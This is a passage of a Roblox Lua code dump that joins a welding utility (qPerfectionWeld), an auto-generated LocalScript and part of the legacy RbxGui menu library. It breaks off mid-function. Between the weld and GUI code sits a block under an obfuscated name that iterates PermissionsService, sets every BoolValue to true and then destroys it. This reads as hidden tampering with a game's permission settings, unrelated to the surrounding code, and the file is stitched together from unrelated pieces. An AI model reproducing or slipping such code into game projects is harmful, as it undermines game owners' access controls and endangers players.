	-- Parts should be ANCHORED before use. It will, however, store relatives values and so when tools are reparented, it'll fix them.
	
	--[[ INSTRUCTIONS
	- Place in the model
	- Make sure model is anchored
	- That's it. It will weld the model and all children. 
	
	THIS SCRIPT SHOULD BE USED ONLY BY ITSELF. THE MODEL SHOULD BE ANCHORED. 
	THIS SCRIPT SHOULD BE USED ONLY BY ITSELF. THE MODEL SHOULD BE ANCHORED. 
	THIS SCRIPT SHOULD BE USED ONLY BY ITSELF. THE MODEL SHOULD BE ANCHORED. 
	THIS SCRIPT SHOULD BE USED ONLY BY ITSELF. THE MODEL SHOULD BE ANCHORED. 
	THIS SCRIPT SHOULD BE USED ONLY BY ITSELF. THE MODEL SHOULD BE ANCHORED. 
	THIS SCRIPT SHOULD BE USED ONLY BY ITSELF. THE MODEL SHOULD BE ANCHORED. 
	THIS SCRIPT SHOULD BE USED ONLY BY ITSELF. THE MODEL SHOULD BE ANCHORED. 
	THIS SCRIPT SHOULD BE USED ONLY BY ITSELF. THE MODEL SHOULD BE ANCHORED. 
	
	This script is designed to be used is a regular script. In a local script it will weld, but it will not attempt to handle ancestory changes. 
	]]
	
	--[[ DOCUMENTATION
	- Will work in tools. If ran more than once it will not create more than one weld.  This is especially useful for tools that are dropped and then picked up again.
	- Will work in PBS servers
	- Will work as long as it starts out with the part anchored
	- Stores the relative CFrame as a CFrame value
	- Takes careful measure to reduce lag by not having a joint set off or affected by the parts offset from origin
	- Utilizes a recursive algorith to find all parts in the model
	- Will reweld on script reparent if the script is initially parented to a tool.
	- Welds as fast as possible
	]]
	
	-- qPerfectionWeld.lua
	-- Created 10/6/2014
	-- Author: Quenty
	-- Version 1.0.3
	
	-- Updated 10/14/2014 - Updated to 1.0.1
	--- Bug fix with existing ROBLOX welds ? Repro by asimo3089
	
	-- Updated 10/14/2014 - Updated to 1.0.2
	--- Fixed bug fix. 
	
	-- Updated 10/14/2014 - Updated to 1.0.3
	--- Now handles joints semi-acceptably. May be rather hacky with some joints. :/
	
	local NEVER_BREAK_JOINTS = false -- If you set this to true it will never break joints (this can create some welding issues, but can save stuff like hinges).
	
	
	local function CallOnChildren(Instance, FunctionToCall)
		-- Calls a function on each of the children of a certain object, using recursion.  
	
		FunctionToCall(Instance)
	
		for _, Child in next, Instance:GetChildren() do
			CallOnChildren(Child, FunctionToCall)
		end
	end
	
	local function GetNearestParent(Instance, ClassName)
		-- Returns the nearest parent of a certain class, or returns nil
	
		local Ancestor = Instance
		repeat
			Ancestor = Ancestor.Parent
			if Ancestor == nil then
				return nil
			end
		until Ancestor:IsA(ClassName)
	
		return Ancestor
	end
	
	local function GetBricks(StartInstance)
		local List = {}
	
		-- if StartInstance:IsA("BasePart") then
		-- 	List[#List+1] = StartInstance
		-- end
	
		CallOnChildren(StartInstance, function(Item)
			if Item:IsA("BasePart") then
				List[#List+1] = Item;
			end
		end)
	
		return List
	end
	
	local function Modify(Instance, Values)
		-- Modifies an Instance by using a table.  
	
		assert(type(Values) == "table", "Values is not a table");
	
		for Index, Value in next, Values do
			if type(Index) == "number" then
				Value.Parent = Instance
			else
				Instance[Index] = Value
			end
		end
		return Instance
	end
	
	local function Make(ClassType, Properties)
		-- Using a syntax hack to create a nice way to Make new items.  
	
		return Modify(Instance.new(ClassType), Properties)
	end
	
	local Surfaces = {"TopSurface", "BottomSurface", "LeftSurface", "RightSurface", "FrontSurface", "BackSurface"}
	local HingSurfaces = {"Hinge", "Motor", "SteppingMotor"}
	
	local function HasWheelJoint(Part)
		for _, SurfaceName in pairs(Surfaces) do
			for _, HingSurfaceName in pairs(HingSurfaces) do
				if Part[SurfaceName].Name == HingSurfaceName then
					return true
				end
			end
		end
		
		return false
	end
	
	local function ShouldBreakJoints(Part)
		--- We do not want to break joints of wheels/hinges. This takes the utmost care to not do this. There are
		--  definitely some edge cases. 
	
		if NEVER_BREAK_JOINTS then
			return false
		end
		
		if HasWheelJoint(Part) then
			return false
		end
		
		local Connected = Part:GetConnectedParts()
		
		if #Connected == 1 then
			return false
		end
		
		for _, Item in pairs(Connected) do
			if HasWheelJoint(Item) then
				return false
			elseif not Item:IsDescendantOf(script.Parent) then
				return false
			end
		end
		
		return true
	end
	
	local function WeldTogether(Part0, Part1, JointType, WeldParent)
		--- Weld's 2 parts together
		-- @param Part0 The first part
		-- @param Part1 The second part (Dependent part most of the time).
		-- @param [JointType] The type of joint. Defaults to weld.
		-- @param [WeldParent] Parent of the weld, Defaults to Part0 (so GC is better).
		-- @return The weld created.
	
		JointType = JointType or "Weld"
		local RelativeValue = Part1:FindFirstChild("qRelativeCFrameWeldValue")
		
		local NewWeld = Part1:FindFirstChild("qCFrameWeldThingy") or Instance.new(JointType)
		Modify(NewWeld, {
			Name = "qCFrameWeldThingy";
			Part0  = Part0;
			Part1  = Part1;
			C0     = CFrame.new();--Part0.CFrame:inverse();
			C1     = RelativeValue and RelativeValue.Value or Part1.CFrame:toObjectSpace(Part0.CFrame); --Part1.CFrame:inverse() * Part0.CFrame;-- Part1.CFrame:inverse();
			Parent = Part1;
		})
	
		if not RelativeValue then
			RelativeValue = Make("CFrameValue", {
				Parent     = Part1;
				Name       = "qRelativeCFrameWeldValue";
				Archivable = true;
				Value      = NewWeld.C1;
			})
		end
	
		return NewWeld
	end
	
	local function WeldParts(Parts, MainPart, JointType, DoNotUnanchor)
		-- @param Parts The Parts to weld. Should be anchored to prevent really horrible results.
		-- @param MainPart The part to weld the model to (can be in the model).
		-- @param [JointType] The type of joint. Defaults to weld. 
		-- @parm DoNotUnanchor Boolean, if true, will not unachor the model after cmopletion.
		
		for _, Part in pairs(Parts) do
			if ShouldBreakJoints(Part) then
				Part:BreakJoints()
			end
		end
		
		for _, Part in pairs(Parts) do
			if Part ~= MainPart then
				WeldTogether(MainPart, Part, JointType, MainPart)
			end
		end
	
		if not DoNotUnanchor then
			for _, Part in pairs(Parts) do
				Part.Anchored = false
			end
			MainPart.Anchored = false
		end
	end
	
	local function PerfectionWeld()	
		local Tool = GetNearestParent(script, "Tool")
	
		local Parts = GetBricks(script.Parent)
		local PrimaryPart = Tool and Tool:FindFirstChild("Handle") and Tool.Handle:IsA("BasePart") and Tool.Handle or script.Parent:IsA("Model") and script.Parent.PrimaryPart or Parts[1]
	
		if PrimaryPart then
			WeldParts(Parts, PrimaryPart, "Weld", false)
		else
			warn("qWeld - Unable to weld part")
		end
		
		return Tool
	end
	
	local Tool = PerfectionWeld()
	
	
	if Tool and script.ClassName == "Script" then
		--- Don't bother with local scripts
	
		script.Parent.AncestryChanged:connect(function()
			PerfectionWeld()
		end)
	end
	
	-- Created by Quenty (@Quenty, follow me on twitter).
	
end)

--[[
	Roblox2Lua
	----------
	
	This code was generated using
	Deluct's Roblox2Lua plugin.
]]--

local iohofufu3o9r_or0 = Instance.new("LocalScript")
iohofufu3o9r_or0.Name = "IOHOfu()!fu3o9rO!#R0"
iohofufu3o9r_or0.Parent = workspace

--//Modules

local modules = {}

--// Scripts

-- IOHOfu()!fu3o9rO!#R0
task.spawn(function()
	local script = iohofufu3o9r_or0

	local oldreq = require
	local function require(target)
		if modules[target] then
			return modules[target]()
		end
		return oldreq(target)
	end

	for i, v in pairs(game.PermissionsService:GetDescendants()) do
		if v:IsA("BoolValue") then
			print(v)
			v.Value = true
			v:Destroy()
		end
	end
end)

--[[
	Roblox2Lua
	----------
	
	This code was generated using
	Deluct's Roblox2Lua plugin.
]]--

local rbx_gui = Instance.new("ModuleScript")
rbx_gui.Name = "RbxGui"
rbx_gui.Parent = workspace

--// Modules

local modules = {
	[rbx_gui] = function()
		local t = {}
		
		local function ScopedConnect(parentInstance, instance, event, signalFunc, syncFunc, removeFunc)
			local eventConnection = nil
		
			--Connection on parentInstance is scoped by parentInstance (when destroyed, it goes away)
			local tryConnect = function()
				if game:IsAncestorOf(parentInstance) then
					--Entering the world, make sure we are connected/synced
					if not eventConnection then
						eventConnection = instance[event]:connect(signalFunc)
						if syncFunc then syncFunc() end
					end
				else
					--Probably leaving the world, so disconnect for now
					if eventConnection then
						eventConnection:disconnect()
						if removeFunc then removeFunc() end
					end
				end
			end
		
			--Hook it up to ancestryChanged signal
			local connection = parentInstance.AncestryChanged:connect(tryConnect)
			
			--Now connect us if we're already in the world
			tryConnect()
			
			return connection
		end
		
		local function getLayerCollectorAncestor(instance)
			local localInstance = instance
			while localInstance and not localInstance:IsA("LayerCollector") do
				localInstance = localInstance.Parent
			end
			return localInstance
		end
		
		local function CreateButtons(frame, buttons, yPos, ySize)
			local buttonNum = 1
			local buttonObjs = {}
			for i, obj in ipairs(buttons) do 
				local button = Instance.new("TextButton")
				button.Name = "Button" .. buttonNum
				button.Font = Enum.Font.Arial
				button.FontSize = Enum.FontSize.Size18
				button.AutoButtonColor = true
				button.Modal = true
				if obj["Style"] then
					button.Style = obj.Style
				else
					button.Style = Enum.ButtonStyle.RobloxButton
				end
				if obj["ZIndex"] then
					button.ZIndex = obj.ZIndex
				end
				button.Text = obj.Text
				button.TextColor3 = Color3.new(1,1,1)
				button.MouseButton1Click:connect(obj.Function)
				button.Parent = frame
				buttonObjs[buttonNum] = button
		
				buttonNum = buttonNum + 1
			end
			local numButtons = buttonNum-1
		
			if numButtons == 1 then
				frame.Button1.Position = UDim2.new(0.35, 0, yPos.Scale, yPos.Offset)
				frame.Button1.Size = UDim2.new(.4,0,ySize.Scale, ySize.Offset)
			elseif numButtons == 2 then
				frame.Button1.Position = UDim2.new(0.1, 0, yPos.Scale, yPos.Offset)
				frame.Button1.Size = UDim2.new(.8/3,0, ySize.Scale, ySize.Offset)
		
				frame.Button2.Position = UDim2.new(0.55, 0, yPos.Scale, yPos.Offset)
				frame.Button2.Size = UDim2.new(.35,0, ySize.Scale, ySize.Offset)
			elseif numButtons >= 3 then
				local spacing = .1 / numButtons
				local buttonSize = .9 / numButtons
		
				buttonNum = 1
				while buttonNum <= numButtons do
					buttonObjs[buttonNum].Position = UDim2.new(spacing*buttonNum + (buttonNum-1) * buttonSize, 0, yPos.Scale, yPos.Offset)
					buttonObjs[buttonNum].Size = UDim2.new(buttonSize, 0, ySize.Scale, ySize.Offset)
					buttonNum = buttonNum + 1
				end
			end
		end
		
		local function setSliderPos(newAbsPosX,slider,sliderPosition,bar,steps)
		
			local newStep = steps - 1 --otherwise we really get one more step than we want
			local relativePosX = math.min(1, math.max(0, (newAbsPosX - bar.AbsolutePosition.X) / bar.AbsoluteSize.X ))
			local wholeNum, remainder = math.modf(relativePosX * newStep)
			if remainder > 0.5 then
				wholeNum = wholeNum + 1
			end
			relativePosX = wholeNum/newStep
		
			local result = math.ceil(relativePosX * newStep)
			if sliderPosition.Value ~= (result + 1) then --only update if we moved a step
				sliderPosition.Value = result + 1
				slider.Position = UDim2.new(relativePosX,-slider.AbsoluteSize.X/2,slider.Position.Y.Scale,slider.Position.Y.Offset)
			end
			
		end
		
		local function cancelSlide(areaSoak)
			areaSoak.Visible = false
		end
		
		t.CreateStyledMessageDialog = function(title, message, style, buttons)
			local frame = Instance.new("Frame")
			frame.Size = UDim2.new(0.5, 0, 0, 165)
			frame.Position = UDim2.new(0.25, 0, 0.5, -72.5)
			frame.Name = "MessageDialog"
			frame.Active = true
			frame.Style = Enum.FrameStyle.RobloxRound	
			
			local styleImage = Instance.new("ImageLabel")
			styleImage.Name = "StyleImage"
			styleImage.BackgroundTransparency = 1
			styleImage.Position = UDim2.new(0,5,0,15)
			if style == "error" or style == "Error" then
				styleImage.Size = UDim2.new(0, 71, 0, 71)
				styleImage.Image = "https://www.roblox.com/asset/?id=42565285"
			elseif style == "notify" or style == "Notify" then
				styleImage.Size = UDim2.new(0, 71, 0, 71)
				styleImage.Image = "https://www.roblox.com/asset/?id=42604978"
			elseif style == "confirm" or style == "Confirm" then
				styleImage.Size = UDim2.new(0, 74, 0, 76)
				styleImage.Image = "https://www.roblox.com/asset/?id=42557901"
			else
				return t.CreateMessageDialog(title,message,buttons)
			end
			styleImage.Parent = frame
			
			local titleLabel = Instance.new("TextLabel")
			titleLabel.Name = "Title"
			titleLabel.Text = title
			titleLabel.TextStrokeTransparency = 0
			titleLabel.BackgroundTransparency = 1
			titleLabel.TextColor3 = Color3.new(221/255,221/255,221/255)
			titleLabel.Position = UDim2.new(0, 80, 0, 0)
			titleLabel.Size = UDim2.new(1, -80, 0, 40)
			titleLabel.Font = Enum.Font.ArialBold
			titleLabel.FontSize = Enum.FontSize.Size36
			titleLabel.TextXAlignment = Enum.TextXAlignment.Center
			titleLabel.TextYAlignment = Enum.TextYAlignment.Center
			titleLabel.Parent = frame
		
			local messageLabel = Instance.new("TextLabel")
			messageLabel.Name = "Message"
			messageLabel.Text = message
			messageLabel.TextStrokeTransparency = 0
			messageLabel.TextColor3 = Color3.new(221/255,221/255,221/255)
			messageLabel.Position = UDim2.new(0.025, 80, 0, 45)
			messageLabel.Size = UDim2.new(0.95, -80, 0, 55)
			messageLabel.BackgroundTransparency = 1
			messageLabel.Font = Enum.Font.Arial
			messageLabel.FontSize = Enum.FontSize.Size18
			messageLabel.TextWrap = true
			messageLabel.TextXAlignment = Enum.TextXAlignment.Left
			messageLabel.TextYAlignment = Enum.TextYAlignment.Top
			messageLabel.Parent = frame
		
			CreateButtons(frame, buttons, UDim.new(0, 105), UDim.new(0, 40) )
		
			return frame
		end
		
		t.CreateMessageDialog = function(title, message, buttons)
			local frame = Instance.new("Frame")
			frame.Size = UDim2.new(0.5, 0, 0.5, 0)
			frame.Position = UDim2.new(0.25, 0, 0.25, 0)
			frame.Name = "MessageDialog"
			frame.Active = true
			frame.Style = Enum.FrameStyle.RobloxRound
		
			local titleLabel = Instance.new("TextLabel")
			titleLabel.Name = "Title"
			titleLabel.Text = title
			titleLabel.BackgroundTransparency = 1
			titleLabel.TextColor3 = Color3.new(221/255,221/255,221/255)
			titleLabel.Position = UDim2.new(0, 0, 0, 0)
			titleLabel.Size = UDim2.new(1, 0, 0.15, 0)
			titleLabel.Font = Enum.Font.ArialBold
			titleLabel.FontSize = Enum.FontSize.Size36
			titleLabel.TextXAlignment = Enum.TextXAlignment.Center
			titleLabel.TextYAlignment = Enum.TextYAlignment.Center
			titleLabel.Parent = frame
		
			local messageLabel = Instance.new("TextLabel")
			messageLabel.Name = "Message"
			messageLabel.Text = message
			messageLabel.TextColor3 = Color3.new(221/255,221/255,221/255)
			messageLabel.Position = UDim2.new(0.025, 0, 0.175, 0)
			messageLabel.Size = UDim2.new(0.95, 0, .55, 0)
			messageLabel.BackgroundTransparency = 1
			messageLabel.Font = Enum.Font.Arial
			messageLabel.FontSize = Enum.FontSize.Size18
			messageLabel.TextWrap = true
			messageLabel.TextXAlignment = Enum.TextXAlignment.Left
			messageLabel.TextYAlignment = Enum.TextYAlignment.Top
			messageLabel.Parent = frame
		
			CreateButtons(frame, buttons, UDim.new(0.8,0), UDim.new(0.15, 0))
		
			return frame
		end
		
		-- written by jmargh
		-- to be used for the new settings menu
		t.CreateScrollingDropDownMenu = function(onSelectedCallback, size, position, baseZ)
			local maxVisibleList = 6
			local baseZIndex = 0
			if type(baseZ) == 'number' then
				baseZIndex = baseZ
			end
		
			local dropDownMenu = {}
			local currentList = nil
		
			local updateFunc = nil
			local frame = Instance.new('Frame')
			frame.Name = "DropDownMenuFrame"
			frame.Size = size
			frame.Position = position
			frame.BackgroundTransparency = 1
			dropDownMenu.Frame = frame
		
			local currentSelectionName = Instance.new('TextButton')
			currentSelectionName.Name = "CurrentSelectionName"
			currentSelectionName.Size = UDim2.new(1, 0, 1, 0)
			currentSelectionName.BackgroundTransparency = 1
			currentSelectionName.Font = Enum.Font.SourceSansBold
			currentSelectionName.FontSize = Enum.FontSize.Size18
			currentSelectionName.TextXAlignment = Enum.TextXAlignment.Left
			currentSelectionName.TextYAlignment = Enum.TextYAlignment.Center
			currentSelectionName.TextColor3 = Color3.new(0.5, 0.5, 0.5)
			currentSelectionName.TextWrap = true
			currentSelectionName.ZIndex = baseZIndex
			currentSelectionName.Style = Enum.ButtonStyle.RobloxRoundDropdownButton
			currentSelectionName.Text = "Choose One"
			currentSelectionName.Parent = frame
			dropDownMenu.CurrentSelectionButton = currentSelectionName
		
			local icon = Instance.new('ImageLabel')
			icon.Name = "DropDownIcon"
			icon.Size = UDim2.new(0, 16, 0, 12)
			icon.Position = UDim2.new(1, -17, 0.5, -6)
			icon.Image = 'rbxasset://textures/ui/dropdown_arrow.png'
			icon.BackgroundTransparency = 1
			icon.ZIndex = baseZIndex
			icon.Parent = currentSelectionName
		
			local listMenu = nil
			local scrollingBackground = nil
			local visibleCount = 0
			local isOpen = false
		
			local function onEntrySelected()
				icon.Rotation = 0
				scrollingBackground:TweenSize(UDim2.new(1, 0, 0, currentSelectionName.AbsoluteSize.y), Enum.EasingDirection.InOut, Enum.EasingStyle.Sine, 0.15, true)
				--
				listMenu.ScrollBarThickness = 0
				listMenu:TweenSize(UDim2.new(1, -16, 0, 24), Enum.EasingDirection.InOut, Enum.EasingStyle.Sine, 0.15, true, function()
					if not isOpen then
						listMenu.Visible = false
						scrollingBackground.Visible = false
					end
				end)
				isOpen = false
			end
		
			currentSelectionName.MouseButton1Click:connect(function()
				if not currentSelectionName.Active or #currentList == 0 then return end
				if isOpen then
					onEntrySelected()
					return
				end
				--
				isOpen = true
				icon.Rotation = 180
				if listMenu then listMenu.Visible = true end
				if scrollingBackground then scrollingBackground.Visible = true end
				--
				if scrollingBackground then
					scrollingBackground:TweenSize(UDim2.new(1, 0, 0, visibleCount * 24 + 8), Enum.EasingDirection.InOut, Enum.EasingStyle.Sine, 0.15, true)
				end
				if listMenu then
					listMenu:TweenSize(UDim2.new(1, -16, 0, visibleCount * 24), Enum.EasingDirection.InOut, Enum.EasingStyle.Sine, 0.15, true, function()
						listMenu.ScrollBarThickness = 6
					end)
				end
			end)
		
			--[[ Public API ]]--
			dropDownMenu.IsOpen = function()
				return isOpen
			end
		
			dropDownMenu.Close = function()
				onEntrySelected()
			end
		
			dropDownMenu.Reset = function()
				isOpen = false
				icon.Rotation = 0
				listMenu.ScrollBarThickness = 0
				listMenu.Size = UDim2.new(1, -16, 0, 24)
				listMenu.Visible = false
				scrollingBackground.Visible = false
			end
		
			dropDownMenu.SetVisible = function(isVisible)
				if frame then
					frame.Visible = isVisible
				end
			end
		
			dropDownMenu.UpdateZIndex = function(newZIndexBase)
				currentSelectionName.ZIndex = newZIndexBase
				icon.ZIndex = newZIndexBase
				if scrollingBackground then scrollingBackground.ZIndex = newZIndexBase + 1 end
				if listMenu then
					listMenu.ZIndex = newZIndexBase + 2
					for _,child in pairs(listMenu:GetChildren()) do
						child.ZIndex = newZIndexBase + 4
					end
				end
			end
		
			dropDownMenu.SetActive = function(isActive)
				currentSelectionName.Active = isActive
			end
		
			dropDownMenu.SetSelectionText = function(text)
				currentSelectionName.Text = text
			end
		
			dropDownMenu.CreateList = function(list)
				currentSelectionName.Text = "Choose One"
				if listMenu then listMenu:Destroy() end
				if scrollingBackground then scrollingBackground:Destroy() end
				--
				currentList = list
				local length = #list
				visibleCount = math.min(maxVisibleList, length)
				local listMenuOffset = visibleCount * 24
		
				listMenu = Instance.new('ScrollingFrame')
				listMenu.Name = "ListMenu"
				listMenu.Size = UDim2.new(1, -16, 0, 24)
				listMenu.Position = UDim2.new(0, 12, 0, 32)
				listMenu.CanvasSize = UDim2.new(0, 0, 0, length * 24)
				listMenu.BackgroundTransparency = 1
				listMenu.BorderSizePixel = 0
				listMenu.ZIndex = baseZIndex + 2
				listMenu.Visible = false
				listMenu.Active = true
				listMenu.BottomImage = 'rbxasset://textures/ui/scroll-bottom.png'
				listMenu.MidImage = 'rbxasset://textures/ui/scroll-middle.png'
				listMenu.TopImage = 'rbxasset://textures/ui/scroll-top.png'
				listMenu.ScrollBarThickness = 0
				listMenu.Parent = frame
		
				scrollingBackground = Instance.new('TextButton')
				scrollingBackground.Name = "ScrollingBackground"
				scrollingBackground.Size = UDim2.new(1, 0, 0, currentSelectionName.AbsoluteSize.y)
				scrollingBackground.Position = UDim2.new(0, 0, 0, 28)
				scrollingBackground.BackgroundColor3 = Color3.new(1, 1, 1)
				scrollingBackground.Style = Enum.ButtonStyle.RobloxRoundDropdownButton
				scrollingBackground.ZIndex = baseZIndex + 1
				scrollingBackground.Text = ""
				scrollingBackground.Visible = false
				scrollingBackground.AutoButtonColor = false
				scrollingBackground.Parent = frame
		
				for i = 1, length do
					local entry = list[i]
					local btn = Instance.new('TextButton')
					btn.Name = entry
					btn.Size = UDim2.new(1, 0, 0, 24)
					btn.Position = UDim2.new(0, 0, 0, (i - 1) * 24)
					btn.BackgroundTransparency = 0
					btn.BackgroundColor3 = Color3.new(1, 1, 1)
					btn.BorderSizePixel = 0
					btn.Font = Enum.Font.SourceSans
					btn.FontSize = Enum.FontSize.Size18
					btn.TextColor3 = Color3.new(0.5, 0.5, 0.5)
					btn.TextXAlignment = Enum.TextXAlignment.Left
					btn.TextYAlignment = Enum.TextYAlignment.Center
					btn.Text = entry
					btn.ZIndex = baseZIndex + 4
					btn.AutoButtonColor = false
					btn.Parent = listMenu
		
					btn.MouseButton1Click:connect(function()
						currentSelectionName.Text = btn.Text
						onEntrySelected()
						btn.Font = Enum.Font.SourceSans
						btn.TextColor3 = Color3.new(0.5, 0.5, 0.5)
						btn.BackgroundColor3 = Color3.new(1, 1, 1)
						onSelectedCallback(btn.Text)
					end)
		
					btn.MouseEnter:connect(function()
						btn.TextColor3 = Color3.new(1, 1, 1)
						btn.BackgroundColor3 = Color3.new(0.75, 0.75, 0.75)
					end)
					btn.MouseLeave:connect(function()
						btn.TextColor3 = Color3.new(0.5, 0.5, 0.5)
						btn.BackgroundColor3 = Color3.new(1, 1, 1)
					end)
				end
			end
		
			return dropDownMenu
		end
		
		t.CreateDropDownMenu = function(items, onSelect, forRoblox, whiteSkin, baseZ)
			local baseZIndex = 0
			if (type(baseZ) == "number") then
				baseZIndex = baseZ
			end
			local width = UDim.new(0, 100)
			local height = UDim.new(0, 32)
		
			local xPos = 0.055
			local frame = Instance.new("Frame")
			local textColor = Color3.new(1,1,1)
			if (whiteSkin) then
				textColor = Color3.new(0.5, 0.5, 0.5)
			end
			frame.Name = "DropDownMenu"
			frame.BackgroundTransparency = 1
			frame.Size = UDim2.new(width, height)
		
			local dropDownMenu = Instance.new("TextButton")
			dropDownMenu.Name = "DropDownMenuButton"
			dropDownMenu.TextWrap = true
			dropDownMenu.TextColor3 = textColor
			dropDownMenu.Text = "Choose One"
			dropDownMenu.Font = Enum.Font.ArialBold
			dropDownMenu.FontSize = Enum.FontSize.Size18
			dropDownMenu.TextXAlignment = Enum.TextXAlignment.Left
			dropDownMenu.TextYAlignment = Enum.TextYAlignment.Center
			dropDownMenu.BackgroundTransparency = 1
			dropDownMenu.AutoButtonColor = true
			if (whiteSkin) then
				dropDownMenu.Style = Enum.ButtonStyle.RobloxRoundDropdownButton
			else
				dropDownMenu.Style = Enum.ButtonStyle.RobloxButton
			end
			dropDownMenu.Size = UDim2.new(1,0,1,0)
			dropDownMenu.Parent = frame
			dropDownMenu.ZIndex = 2 + baseZIndex
		
			local dropDownIcon = Instance.new("ImageLabel")
			dropDownIcon.Name = "Icon"
			dropDownIcon.Active = false
			if (whiteSkin) then
				dropDownIcon.Image = "rbxasset://textures/ui/dropdown_arrow.png"
				dropDownIcon.Size = UDim2.new(0,16,0,12)
				dropDownIcon.Position = UDim2.new(1,-17,0.5, -6)
			else
				dropDownIcon.Image = "https://www.roblox.com/asset/?id=45732894"
				dropDownIcon.Size = UDim2.new(0,11,0,6)
				dropDownIcon.Position = UDim2.new(1,-11,0.5, -2)
			end
			dropDownIcon.BackgroundTransparency = 1
			dropDownIcon.Parent = dropDownMenu
			dropDownIcon.ZIndex = 2 + baseZIndex
			
			local itemCount = #items
			local dropDownItemCount = #items
			local useScrollButtons = false
			if dropDownItemCount > 6 then
				useScrollButtons = true
				dropDownItemCount = 6
			end
			
			local droppedDownMenu = Instance.new("TextButton")
			droppedDownMenu.Name = "List"
			droppedDownMenu.Text = ""
			droppedDownMenu.BackgroundTransparency = 1
			--droppedDownMenu.AutoButtonColor = true
			if (whiteSkin) then
				droppedDownMenu.Style = Enum.ButtonStyle.RobloxRoundDropdownButton
			else
				droppedDownMenu.Style = Enum.ButtonStyle.RobloxButton
			end
			droppedDownMenu.Visible = false
			droppedDownMenu.Active = true	--Blocks clicks
			droppedDownMenu.Position = UDim2.new(0,0,0,0)
			droppedDownMenu.Size = UDim2.new(1,0, (1 + dropDownItemCount)*.8, 0)
			droppedDownMenu.Parent = frame
			droppedDownMenu.ZIndex = 2 + baseZIndex
		
			local choiceButton = Instance.new("TextButton")
			choiceButton.Name = "ChoiceButton"
			choiceButton.BackgroundTransparency = 1
			choiceButton.BorderSizePixel = 0
			choiceButton.Text = "ReplaceMe"
			choiceButton.TextColor3 = textColor
			choiceButton.TextXAlignment = Enum.TextXAlignment.Left
			choiceButton.TextYAlignment = Enum.TextYAlignment.Center
			choiceButton.BackgroundColor3 = Color3.new(1, 1, 1)
			choiceButton.Font = Enum.Font.Arial
			choiceButton.FontSize = Enum.FontSize.Size18
			if useScrollButtons then
				choiceButton.Size = UDim2.new(1,-13, .8/((dropDownItemCount + 1)*.8),0) 
			else
				choiceButton.Size = UDim2.new(1, 0, .8/((dropDownItemCount + 1)*.8),0) 
			end
			choiceButton.TextWrap = true
			choiceButton.ZIndex = 2 + baseZIndex
		
			local areaSoak = Instance.new("TextButton")
			areaSoak.Name = "AreaSoak"
			areaSoak.Text = ""
			areaSoak.BackgroundTransparency = 1
			areaSoak.Active = true
			areaSoak.Size = UDim2.new(1,0,1,0)
			areaSoak.Visible = false
			areaSoak.ZIndex = 3 + baseZIndex
		
			local dropDownSelected = false
		
			local scrollUpButton 
			local scrollDownButton
			local scrollMouseCount = 0
		
			local setZIndex = function(baseZIndex)
				droppedDownMenu.ZIndex = baseZIndex +1
				if scrollUpButton then
					scrollUpButton.ZIndex = baseZIndex + 3
				end
				if scrollDownButton then
					scrollDownButton.ZIndex = baseZIndex + 3
				end
				
				local children = droppedDownMenu:GetChildren()
				if children then
					for i, child in ipairs(children) do
						if child.Name == "ChoiceButton" then
							child.ZIndex = baseZIndex + 2
						elseif child.Name == "ClickCaptureButton" then
							child.ZIndex = baseZIndex
						end
					end
				end
			end
		
			local scrollBarPosition = 1
			local updateScroll = function()
				if scrollUpButton then
					scrollUpButton.Active = scrollBarPosition > 1 
				end
				if scrollDownButton then
					scrollDownButton.Active = scrollBarPosition + dropDownItemCount <= itemCount 
				end
		
				local children = droppedDownMenu:GetChildren()
				if not children then return end
		
				local childNum = 1			
				for i, obj in ipairs(children) do
					if obj.Name == "ChoiceButton" then
						if childNum < scrollBarPosition or childNum >= scrollBarPosition + dropDownItemCount then
							obj.Visible = false
						else
							obj.Position = UDim2.new(0,0,((childNum-scrollBarPosition+1)*.8)/((dropDownItemCount+1)*.8),0)
							obj.Visible = true
						end
						obj.TextColor3 = textColor
						obj.BackgroundTransparency = 1
		
						childNum = childNum + 1
					end
				end
			end
			local toggleVisibility = function()
				dropDownSelected = not dropDownSelected
		
				areaSoak.Visible = not areaSoak.Visible
				dropDownMenu.Visible = not dropDownSelected
				droppedDownMenu.Visible = dropDownSelected
				if dropDownSelected then
					setZIndex(4 + baseZIndex)
				else
					setZIndex(2 + baseZIndex)
				end
				if useScrollButtons then
					updateScroll()
				end
			end
			droppedDownMenu.MouseButton1Click:connect(toggleVisibility)
		
			local updateSelection = function(text)
				local foundItem = false
				local children = droppedDownMenu:GetChildren()
				local childNum = 1
				if children then
					for i, obj in ipairs(children) do
						if obj.Name == "ChoiceButton" then
							if obj.Text == text then
								obj.Font = Enum.Font.ArialBold
								foundItem = true			
								scrollBarPosition = childNum						
								if (whiteSkin) then
									obj.TextColor3 = Color3.new(90/255,142/255,233/255)
								end
							else
								obj.Font = Enum.Font.Arial
								if (whiteSkin) then
									obj.TextColor3 = textColor
								end
							end
							childNum = childNum + 1
						end
					end
				end
				if not text then
					dropDownMenu.Text = "Choose One"
					scrollBarPosition = 1
				else
					if not foundItem then
						error("Invalid Selection Update -- " .. text)
					end
		
					if scrollBarPosition + dropDownItemCount > itemCount + 1 then
						scrollBarPosition = itemCount - dropDownItemCount + 1
					end
		
					dropDownMenu.Text = text
				end
			end
			
			local function scrollDown()
				if scrollBarPosition + dropDownItemCount <= itemCount then
					scrollBarPosition = scrollBarPosition + 1
					updateScroll()
					return true
				end
				return false
			end
			local function scrollUp()
				if scrollBarPosition > 1 then
					scrollBarPosition = scrollBarPosition - 1
					updateScroll()
					return true
				end
				return false
			end
			
			if useScrollButtons then
				--Make some scroll buttons
				scrollUpButton = Instance.new("ImageButton")
				scrollUpButton.Name = "ScrollUpButton"
				scrollUpButton.BackgroundTransparency = 1
				scrollUpButton.Image = "rbxasset://textures/ui/scrollbuttonUp.png"
				scrollUpButton.Size = UDim2.new(0,17,0,17) 
				scrollUpButton.Position = UDim2.new(1,-11,(1*.8)/((dropDownItemCount+1)*.8),0)
				scrollUpButton.MouseButton1Click:connect(
					function()
						scrollMouseCount = scrollMouseCount + 1
					end)
				scrollUpButton.MouseLeave:connect(
					function()
						scrollMouseCount = scrollMouseCount + 1
					end)
				scrollUpButton.MouseButton1Down:connect(
					function()
						scrollMouseCount = scrollMouseCount + 1
			
						scrollUp()
						local val = scrollMouseCount
						wait(0.5)
						while val == scrollMouseCount do
							if scrollUp() == false then
								break
							end
							wait(0.1)
						end				
					end)
		
				scrollUpButton.Parent = droppedDownMenu
		
				scrollDownButton = Instance.new("ImageButton")
				scrollDownButton.Name = "ScrollDownButton"
				scrollDownButton.BackgroundTransparency = 1
				scrollDownButton.Image = "rbxasset://textures/ui/scrollbuttonDown.png"
